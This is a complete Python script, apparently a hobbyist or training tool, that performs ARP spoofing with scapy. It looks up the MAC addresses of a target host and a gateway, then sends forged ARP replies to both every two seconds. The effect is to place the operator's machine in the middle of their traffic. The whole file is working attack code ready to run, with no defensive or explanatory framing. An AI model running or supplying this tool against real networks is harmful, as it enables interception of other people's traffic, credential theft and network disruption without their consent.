#!/usr/bin/env python3

import argparse
import time
import scapy.all as scapy
from termcolor import colored
import signal
import logging
import sys
from pwn import *

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def handler(sig, frame):
    print(colored(f"\n[!] Stopping...\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, handler)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer Tool")
    parser.add_argument('-i', '--interface', dest='interface', required=True, help='Interface')
    parser.add_argument('-t', '--target', dest='target', required=True, help='Host/IP Range')
    parser.add_argument('-g', '--gateway', dest='gateway', required=True, help='Gateway to Spoof')

    return parser.parse_args()

def get_mac(ip, interface):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=interface)[0]
    
    if not answered_list:
        print(colored(f"[!] No se pudo obtener MAC de {ip}", 'red'))
        sys.exit(1)
    
    return answered_list[0][1].hwsrc


def spoof(target, spoof, target_mac, interface):
    my_mac = scapy.get_if_hwaddr(str(interface))
    arp_packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, psrc=spoof, hwsrc=my_mac)
    scapy.send(arp_packet, verbose=False)

def main():
    args = get_arguments()
    
    print(colored(f"[*] Obtaining MACs...", 'blue'))
    target_mac = get_mac(args.target, args.interface)
    gateway_mac =  get_mac(args.gateway, args.interface)

    print(colored(f"[+] Target {args.target} -> MAC: {target_mac}", 'green'))
    print(colored(f"[+] Gateway {args.gateway} -> MAC: {gateway_mac}", 'green'))
    print(colored(f"[*] Starting ARP Spoofing... (Ctrl+C to stop)", 'yellow'))

    p1 = log.progress("Send Packets")
    packets_sent=0
    while True:
        spoof(args.target, args.gateway, target_mac, args.interface)
        spoof(args.gateway, args.target, gateway_mac, args.interface)
        
        packets_sent+=2

        p1.status(colored(f"{packets_sent}", 'cyan'))

        time.sleep(2)

if __name__ == '__main__':
    main()

